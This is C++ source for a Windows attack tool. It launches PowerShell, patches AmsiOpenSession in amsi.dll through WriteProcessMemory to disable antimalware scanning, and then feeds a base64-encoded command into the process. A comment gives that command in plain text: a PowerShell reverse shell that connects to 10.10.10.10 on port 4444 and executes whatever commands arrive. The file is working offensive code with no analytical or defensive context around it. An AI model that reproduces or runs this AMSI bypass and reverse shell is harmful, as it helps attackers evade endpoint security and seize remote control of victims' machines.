#include <iostream>
#include <Windows.h>
#include <string>
#include <sstream>


std::string get_path(std::stringstream& path_stream) {
    std::string token;
    while (std::getline(path_stream, token, ';')) {
        if (token.find("WindowsPower") != std::string::npos) {
            return token;
        }
    }

    return "";
}


int get_length_path(const std::string& path) {
    return MultiByteToWideChar(
        CP_UTF8,
        0,
        path.c_str(),
        -1,
        nullptr,
        0
    );
}


LPWSTR string_to_LPWSTR(const std::string& path)
{
    int bufferLength = get_length_path(path);
    LPWSTR wpath = new WCHAR[bufferLength];
    ZeroMemory(wpath, sizeof(WCHAR) * bufferLength);
    MultiByteToWideChar(
        CP_UTF8,
        0,
        path.c_str(),
        -1,
        wpath,
        bufferLength
    );

    return wpath;
}

char* get_env(const char* name) {
    const DWORD buffer_size = 65535;
    char* buffer = new char[buffer_size];
    if (buffer == nullptr) {
        return nullptr;
    }

    DWORD result = GetEnvironmentVariableA(name, buffer, buffer_size);
    return buffer;
}


bool patch_amsi(HANDLE hProcess) {
    HMODULE ams_dll = LoadLibraryW(L"amsi.dll");
    bool success = false;
    if (ams_dll != NULL) {
        FARPROC addr = GetProcAddress(ams_dll, "AmsiOpenSession");
        char* addr_ptr = reinterpret_cast<char*>(addr);
        const char new_value[] = { 0x00, 0x00, 0x00, 0x00};
        SIZE_T size = sizeof(new_value);
        SIZE_T bytes_written;
        DWORD offset = 0xC;
        if (WriteProcessMemory(hProcess, addr_ptr + offset, new_value, size, &bytes_written) != 0) {
            success = true;
        }

        FreeLibrary(ams_dll);
    }

    return success;
}


int main()
{
    char* path = get_env("PATH");
    if (path == nullptr) {
        return EXIT_FAILURE;
    }

    std::stringstream path_stream;
    path_stream << path;
    delete[] path;
    std::string path_power = get_path(path_stream);
    if (path_power == "") {
        return EXIT_FAILURE;
    }

    std::string power = path_power + "\\powershell.exe";
    LPWSTR wpower_path = string_to_LPWSTR(power);
    STARTUPINFO si;
    LPSTARTUPINFOW psi = reinterpret_cast<LPSTARTUPINFOW>(&si);
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0) ||
        !SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0)) {
        std::cerr << "Error creating standard output pipe\n";
        return EXIT_FAILURE;
    }

    if (!CreatePipe(&hStdinRd, &hStdinWr, &sa, 0) ||
        !SetHandleInformation(hStdinWr, HANDLE_FLAG_INHERIT, 0)) {
        std::cerr << "Error creating standard input pipe\n";
        return EXIT_FAILURE;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdinRd;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;
    if (!CreateProcessAsUserW(
        NULL,
        wpower_path,
        NULL,
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        psi,
        &pi)
        )
    {
        return EXIT_FAILURE;
    }

    Sleep(6000); 
    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, pi.dwThreadId);
    if (hThread == NULL) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hStdinRd);
        CloseHandle(hStdoutRd);
        CloseHandle(hStdinWr);
        return EXIT_FAILURE;
    }

    SuspendThread(hThread);
    Sleep(6000);
    if (patch_amsi(pi.hProcess)) {
        ResumeThread(hThread);
         //base64 = $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object {0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = ([System.Text.Encoding]::ASCII).GetString($bytes, 0, $i);$sendback = (Invoke-Expression $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close();
        std::string command = "Invoke-Expression -Command ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>')))";
        WORD length = static_cast<WORD>(command.length());
        DWORD bytes_written;
        WriteFile(hStdinWr, command.c_str(), length, &bytes_written, NULL);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdinRd);
    CloseHandle(hStdoutRd);
    CloseHandle(hStdinWr);
    delete[] wpower_path;
    return EXIT_SUCCESS;
}
